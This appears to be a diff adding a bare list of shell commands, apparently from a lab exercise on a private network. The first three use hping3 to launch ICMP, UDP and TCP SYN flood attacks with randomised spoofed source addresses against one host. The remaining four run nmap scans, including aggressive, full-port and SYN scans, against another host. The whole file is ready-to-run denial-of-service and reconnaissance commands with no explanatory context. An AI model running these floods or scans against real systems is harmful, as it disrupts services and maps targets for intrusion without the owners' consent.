@@ -1,0 +1,8 @@
+sudo hping3 -1 --flood --rand-source 192.168.1.122
+sudo hping3 --udp --flood --rand-source -p 53 192.168.1.122
+sudo hping3 -S --flood --rand-source -p 80 192.168.1.122
+
+nmap -F 192.168.1.113
+nmap -A -T4 192.168.1.113
+nmap -p- 192.168.1.113
+sudo nmap -sS 192.168.1.113
